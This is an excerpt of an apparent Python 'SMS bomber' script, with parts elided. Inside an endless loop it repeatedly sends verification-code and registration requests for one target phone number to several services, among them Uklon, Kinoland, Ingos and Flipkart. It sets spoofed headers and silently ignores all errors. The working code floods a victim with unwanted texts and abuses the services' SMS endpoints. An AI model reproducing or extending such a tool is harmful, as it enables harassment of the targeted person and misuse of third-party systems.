    ...
    while True:
        ...
        try:
            post("https://uklon.com.ua/api/v1/account/code/send",
                 headers={"client_id": "6289de851fc726f887af8d5d7a56c635", "User-Agent": ua},
                 json={"phone": phone})
        except:
            pass
        try:
        ...
        try:
            post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code",
                 json={"phone": phone},
                 headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9", "User-Agent": ua})
        except:
            pass
        try:
        ...
        try:
            post("https://api.kinoland.com.ua/api/v1/service/send-sms",
                 headers={"Agent": "website", "User-Agent": ua},
        ...
        try:
            post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",
                 headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal", "User-Agent": ua},
        ...
        try:
            post("https://www.flipkart.com/api/5/user/otp/generate",
                 headers={"Origin": "https://www.flipkart.com", "User-Agent": ua},
                 data={"loginId": "+" + phone})
        except:
            pass
        try:
        ...
        try:
            get("https://it.buzzolls.ru:9995/api/v2/auth/register",
                ...
                headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3", "User-Agent": ua})
        except:
            pass
        try:
